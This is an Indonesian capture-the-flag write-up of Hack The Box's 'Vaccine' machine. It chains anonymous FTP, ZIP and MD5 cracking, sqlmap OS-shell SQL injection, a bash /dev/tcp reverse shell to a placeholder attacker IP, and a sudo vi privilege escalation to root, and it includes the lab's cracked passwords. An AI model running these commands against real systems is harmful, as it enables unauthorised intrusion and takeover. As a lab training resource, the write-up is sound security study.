# Vaccine — SQL Injection + Privilege Escalation via Sudo Misconfiguration

**Date:** 2026-05-16
**Platform:** Hack The Box (Starting Point)
**Difficulty:** Very Easy
**Category:** Web / Linux / Database

---

## Target

Mesin Linux bernama **Vaccine** dari HTB Starting Point. Menjalankan FTP server, SSH, dan web app Apache bernama **MegaCorp Car Catalogue** dengan halaman login admin. Mesin ini mensimulasikan skenario nyata di mana backup file web tersimpan di FTP publik, lalu berujung ke SQL Injection dan privilege escalation.

## Vulnerability

| # | Vulnerability | Lokasi |
|---|---|---|
| 1 | Anonymous FTP Login | Port 21 |
| 2 | Weak ZIP Password | backup.zip |
| 3 | MD5 Hash (Crackable) | index.php |
| 4 | SQL Injection | dashboard.php?search= |
| 5 | Hardcoded DB Credentials | dashboard.php |
| 6 | Sudo Misconfiguration (vi) | /etc/sudoers |

## Tools Used

- **Nmap** — port scanning & service enumeration
- **FTP client** — anonymous login & file download
- **zip2john + John the Ripper** — crack password ZIP
- **sqlmap** — automated SQL injection & OS shell
- **Netcat (nc)** — reverse shell listener
- **Python pty** — TTY shell upgrade

---

## Exploitation Steps

### Step 1 — Reconnaissance (Nmap)

Scan target untuk temukan port terbuka dan versi service yang berjalan.

```bash
nmap -sV -sC -T4 <TARGET_IP>
```

**Hasil penting:**
```
21/tcp  open  ftp     vsftpd 3.0.3
  | ftp-anon: Anonymous FTP login allowed
  |_-rwxr-xr-x  1  0  0  2533 Apr 13 2021 backup.zip
22/tcp  open  ssh     OpenSSH 8.0p1
80/tcp  open  http    Apache httpd 2.4.41
  |_http-title: MegaCorp Login
```

**Flag switch nmap:**
- `-sV` → deteksi versi service
- `-sC` → jalanin default NSE scripts (termasuk ftp-anon)
- `-T4` → timing agresif, aman di environment HTB

---

### Step 2 — FTP Anonymous Login & Download Backup

FTP server mengizinkan login tanpa password (anonymous). File `backup.zip` ditemukan dan didownload.

```bash
ftp <TARGET_IP>
# Username: anonymous
# Password: (tekan Enter)
ftp> ls
ftp> get backup.zip
ftp> exit
```

**Kenapa berbahaya:** Siapapun bisa akses tanpa kredensial. File backup berisi source code web yang sensitif.

---

### Step 3 — Crack Password ZIP

ZIP file diproteksi password. Ekstrak hash lalu crack dengan wordlist rockyou.txt.

```bash
zip2john backup.zip > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Password ditemukan:** `741852963`

```bash
unzip backup.zip
# Masukkan password di atas saat diminta
```

**Perbedaan teknik cracking:**
- Wordlist attack = cocokkan dari daftar password yang sudah ada
- Brute force = coba semua kombinasi karakter (jauh lebih lambat)

---

### Step 4 — Analisis Source Code & Crack MD5

File `index.php` berisi logika login web. Ditemukan username dan MD5 hash password admin.

```php
// Potongan logika login di index.php
if($_POST['username'] === 'admin' && md5($_POST['password']) === "HASH_DISINI")
```

Hash MD5 bersifat **one-way** (tidak bisa dibalik langsung). Cara crack:

```bash
echo "HASH_DISINI" > hashpw.txt
john --format=RAW-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hashpw.txt
```

**Kredensial web admin ditemukan:**
- Username: `admin`
- Password: `qwerty789`

**Perbedaan Hash vs Enkripsi:**
- Hash = satu arah, tidak bisa dibalik (MD5, SHA256)
- Enkripsi = dua arah, bisa di-decrypt dengan key (AES, RSA)

---

### Step 5 — SQL Injection via Search Box

Login ke web app di `http://<TARGET_IP>` menggunakan kredensial admin. Dashboard menampilkan katalog mobil dengan fitur search.

**Test SQLi:** Masukkan karakter `'` (single quote) di kolom search → muncul verbose error:
```
ERROR: unterminated quoted string
Select * from cars where name like '%'%'
```

Verbose error mengkonfirmasi:
- Parameter `search` vulnerable terhadap SQL Injection
- Database: **PostgreSQL**
- Nama tabel: `cars`

---

### Step 6 — sqlmap OS Shell

Ambil PHPSESSID dari browser (F12 → Application → Cookies), lalu jalankan sqlmap.

```bash
sqlmap -u "http://<TARGET_IP>/dashboard.php?search=test" \
--cookie="PHPSESSID=<SESSION_VALUE>" \
--os-shell \
--dbms=PostgreSQL \
--level=1 --risk=1
```

**Flag switch sqlmap:**
- `-u` → target URL yang vulnerable
- `--cookie` → session cookie agar sqlmap bisa akses halaman login-protected
- `--os-shell` → eksploit SQLi untuk dapat shell OS langsung
- `--dbms` → skip deteksi DB, fokus ke PostgreSQL (lebih cepat)
- `--level/--risk` → kedalaman dan risiko testing payload

**Kenapa butuh cookie:** Dashboard butuh autentikasi. Tanpa PHPSESSID, server redirect ke halaman login dan sqlmap tidak bisa akses target.

---

### Step 7 — Reverse Shell

Dari `os-shell`, buka reverse shell yang lebih stabil ke Kali.

**Terminal 1 — listener:**
```bash
nc -lvnp 4444
# -l = listen mode
# -v = verbose
# -n = no DNS lookup
# -p = port yang digunakan
```

**Terminal 2 — di os-shell:**
```bash
bash -c 'bash -i >& /dev/tcp/<TUN0_IP>/4444 0>&1'
```

**Catatan penting:** Gunakan IP `tun0` (IP VPN HTB), **bukan** `eth0`. Target hanya bisa reach IP yang ada di network HTB.

**Upgrade ke TTY shell** (wajib untuk jalankan sudo):
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Tekan Ctrl+Z
stty raw -echo; fg
# Tekan Enter dua kali
export TERM=xterm
export SHELL=bash
```

Jika terminal ngebug/kacau setelah upgrade:
```bash
reset
# atau
stty sane
```

---

### Step 8 — User Flag

```bash
find ~ -name *.txt
cat /var/lib/postgresql/user.txt
```

**User flag ditemukan** ✅

---

### Step 9 — Privilege Escalation (Hardcoded Creds + Sudo vi)

**Cari kredensial database** dari source code web (hardcoded credentials):

```bash
cat /var/www/html/dashboard.php
```

Ditemukan koneksi database:
```php
$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=PASSWORD_DISINI");
```

**Cek sudo privileges:**
```bash
sudo -l
# Masukkan password postgres yang ditemukan di atas
```

Output:
```
User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

**Eksploit sudo vi (GTFOBins technique):**
```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Di dalam vi, ketik:
```
:shell
```

Shell baru spawn sebagai **root**!

**Kenapa vi bisa privesc:** Vi punya fitur spawn shell dari dalam editor. Kalau vi dijalankan sebagai root via sudo, shell yang di-spawn juga root. Referensi: [gtfobins.github.io](https://gtfobins.github.io)

---

### Step 10 — Root Flag

```bash
cat /root/root.txt
```

**Root flag ditemukan** ✅

---

## Lokasi Flag (Standar HTB)

```
User flag → /home/<username>/user.txt
Root flag → /root/root.txt
```

---

## Default Path Penting di Linux

```
Web root Apache/Nginx → /var/www/html/
Home root user        → /root/
```

---

## Lessons Learned

- **Anonymous FTP** selalu jadi target pertama — kalau ada, langsung eksploit sebelum yang lain
- **Backup file** di server publik sangat berbahaya — sering mengandung source code dan kredensial
- **Hardcoded credentials** di file PHP adalah kesalahan umum developer — selalu cek file config dan koneksi DB
- **Verbose error** dari database adalah hadiah bagi attacker — developer wajib matikan di production
- **sudo -l** adalah langkah wajib setelah dapat shell — cek misconfiguration privilege
- **GTFOBins** wajib dibookmark — banyak binary "innocent" yang bisa dieksploit untuk privesc
- TTY upgrade wajib dilakukan sebelum jalankan sudo di reverse shell
- IP yang dipakai di reverse shell harus **tun0** (VPN), bukan eth0 (lokal)

---

## Konsep yang Dipelajari

| Konsep | Penjelasan Singkat |
|---|---|
| SQL Injection | Inject query SQL ke input web untuk manipulasi database |
| Reverse Shell | Server yang konek balik ke attacker, bukan sebaliknya |
| TTY Shell | Terminal interaktif penuh, diperlukan untuk sudo dan program interaktif |
| Session Hijacking | Bajak sesi orang lain menggunakan cookie yang dicuri |
| Hardcoded Credentials | Kredensial yang ditulis langsung di source code |
| GTFOBins | Binary biasa yang bisa dieksploit untuk privilege escalation |
| Hash vs Enkripsi | Hash = satu arah, Enkripsi = dua arah (bisa dibalik dengan key) |
| Wordlist vs Brute Force | Wordlist = cocokkan dari daftar, Brute force = coba semua kombinasi |